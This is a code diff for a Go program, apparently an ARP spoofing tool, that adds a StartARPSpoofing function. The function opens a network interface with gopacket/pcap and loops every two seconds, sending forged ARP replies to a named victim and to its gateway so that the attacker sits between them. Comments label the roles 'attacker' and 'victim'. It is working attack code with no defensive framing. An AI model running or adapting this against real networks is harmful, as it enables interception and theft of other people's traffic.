@@ -2,11 +2,13 @@ package main
 
 import (
 	"fmt"
+	"net"
+	"os"
+	"time"
+
 	"github.com/google/gopacket"
 	"github.com/google/gopacket/layers"
 	"github.com/google/gopacket/pcap"
-	"net"
-	"os"
 )
 
 // Sending Fake ARP reply - even when not asked
@@ -78,4 +80,42 @@ func EnableIPForwarding() error {
 	return nil
 }
 
+// Starting the ARP spoofing
+// localNetwork => attacker
+func StartARPSpoofing(
+	localNetwork networkInterface,
+	targetIP string, targetMAC string,
+	gatewayIP string, gatewayMAC string,
+) error {
 
+	// Open the network interface
+	handle, err := pcap.OpenLive(
+		localNetwork.interfaceName,
+		1600,
+		true,
+		pcap.BlockForever,
+	)
+	if err != nil {
+		return fmt.Errorf("Faild to open interface: %v", err)
+	}
+
+	defer handle.Close()
+
+	// Poison every 2 seconds
+	ticker := time.NewTicker(time.Second * 2)
+
+	for {
+		<-ticker.C
+
+		// Poison the victim - 'Hey victim, I am the gateway'
+		if err := SendARPSpoof(handle, targetIP, targetMAC, gatewayIP, localNetwork); err != nil {
+			return err
+		}
+
+		// Poison the gateway - 'Hey gateway, I am the target'
+		if err := SendARPSpoof(handle, gatewayIP, gatewayMAC, targetIP, localNetwork); err != nil {
+			return err
+		}
+	}
+
+}
